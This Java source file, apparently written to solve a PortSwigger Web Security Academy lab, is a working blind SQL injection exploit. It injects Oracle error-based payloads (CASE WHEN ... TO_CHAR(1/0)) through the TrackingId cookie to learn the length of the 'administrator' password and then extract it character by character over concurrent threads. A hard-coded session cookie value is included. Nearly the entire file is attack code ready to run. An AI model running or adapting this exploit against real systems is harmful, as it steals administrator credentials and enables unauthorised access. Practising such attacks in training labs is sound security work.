package br.com.sqli.portswagger;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReferenceArray;

public class PerfomAttack {

	private String url;
	private ExecutorService threadPool;
	private AtomicReferenceArray<String> password;

	public PerfomAttack(String urlScanned) {
		this.url = urlScanned;
		
	}

	public String execute() throws InterruptedException {
		int length =findPasswordLength();
		System.out.println("[+] Password length is " + length);
		
		this.threadPool = Executors.newCachedThreadPool(new ThreadsFactory());
		this.password = new AtomicReferenceArray<String>(length);
		initializeConsumers(length);
		threadPool.shutdown();
		threadPool.awaitTermination(10, TimeUnit.MINUTES);
		return buildString();
	}
	
	private String buildString() {
		StringBuilder stringBuilder = new StringBuilder();
		for(int i = 0; i< this.password.length(); i++) {
			stringBuilder.append(this.password.get(i));
		}
		return stringBuilder.toString();
	};
	
	
	private void initializeConsumers(int size) {
		for (int i = 1; i <= size; i++) {
			ConsumerTask consumer = new ConsumerTask(password, i, url);
			this.threadPool.execute(consumer);
		}
	}

	private int findPasswordLength() {
		HttpClient httpClient = HttpClient.newBuilder().build();
		int length = 0;
		try {

			while (true) {

				String payload = encodeValue(
						"aQbyIVejQ2QkoBot' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username='administrator' and LENGTH(password)>"+ length +") || '");

				HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url))
						.header("Cookie", "session=9miO3JWOCvC0iLWw0hmzRUVwuacvf4ZW; TrackingId=" + payload).build();
				HttpResponse<String> response = httpClient.send(request, BodyHandlers.ofString());
				
				if (response.statusCode() != 500) {
					break;
				}
				length++;
			}


		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		}
		return length;
	}

	private String encodeValue(String value) throws UnsupportedEncodingException {
		return URLEncoder.encode(value, StandardCharsets.UTF_8.toString());
	}
}
